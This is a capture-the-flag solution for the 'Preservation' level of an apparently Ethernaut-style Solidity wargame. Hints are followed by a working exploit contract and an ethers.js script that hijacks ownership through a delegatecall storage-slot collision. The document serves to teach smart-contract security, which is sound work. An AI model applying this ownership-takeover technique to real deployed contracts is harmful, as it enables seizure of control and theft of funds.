# 16 - Preservation

### Hints

<details>

<summary>Hint One</summary>

The `Preservation` contract uses `delegatecall` to execute functions on the `LibraryContract`. When the `LibraryContract` executes an expression to update a state variable, on which contract is this state variable updated?

</details>

<details>

<summary>Hint Two</summary>

The `LibraryContract` only contains one state variable, as opposed to the \`Preservation\` contract’s five state variables. What does this mean in terms of which memory slots the `LibraryContract` may update on the calling contract?

</details>

<details>

<summary>Hint Three</summary>

As the `LibraryContract` can only update the first storage slot of `Preservation`, this contract will not grant you sufficient leverage to update the `owner` variable on its own. Right idea, wrong storage slot being updated.

</details>

### Scripted Solution

```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

contract PreservationExploit {
    // Lay out storage to match `Preservation` contract
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    /**
     * Converts `time` to address and uses it to set `owner` variable.
     */
    function setTime(uint time) public {
        owner = address(uint160(time));
    }
}
```

```javascript
const fs = require('fs')
const ethers = require('ethers')
require('dotenv').config({ path: './.env' })

/**
 * Initialize Ethers objects needed to interact with the blockchain and
 * contract.
 */
async function setup(contractName) {
  // Create provider - a read-only abstraction to access blockchain data
  const provider = new ethers.providers.InfuraProvider(process.env.NETWORK)
  // Create player wallet
  const playerWallet = new ethers.Wallet(process.env.PRIVATE_KEY)
  // Create player wallet signer - an abstraction of an Ethereum account
  const playerWalletSigner = await playerWallet.connect(provider)
  // Create contract instance - an abstraction of the deployed contract code
  const contractAbi = fs.readFileSync(`./${contractName}.abi`, 'utf8')
  const contract = new ethers.Contract(
    process.env.CONTRACT_ADDRESS,
    contractAbi,
    playerWalletSigner
  )

  return { provider, playerWallet, playerWalletSigner, contract }
}

/**
 * Run contract exploit.
 */
async function main() {
  // Get Ethers objects needed to interact with the blockchain and contract
  const { contract: preservationContract } = await setup('Preservation')

  // Address of `PreservationExploit` contract
  const exploitContractAddress = '0x22f91Fb6b56aB7C5785E939905DAcB3eb8d5C76b'

  // Call `setFirstTime` to set `timeZone1Library` to exploit contract address
  const setExploitContractAddressTx = await preservationContract.setFirstTime(
    exploitContractAddress
  )
  await setExploitContractAddressTx.wait(1)

  // Pad player address with 00 bytes to format as uint256
  const paddedPlayerAddress =
    '0x00000000000000000000000053D43a3eBFC7b610A2Ba87BC783d555D4Cb3B363'

  // Call `setFirstTime` again to set `owner` address via exploit contract
  const setOwnerAddressTx = await preservationContract.setFirstTime(
    paddedPlayerAddress,
    // Send along some extra gas
    {
      gasLimit: 1000000,
      gasPrice: 20000000000
    }
  )
  await setOwnerAddressTx.wait(1)
}

main()
  .then(() => process.exit(0))
  .catch(error => {
    console.error(error)
    process.exit(1)
  })
```
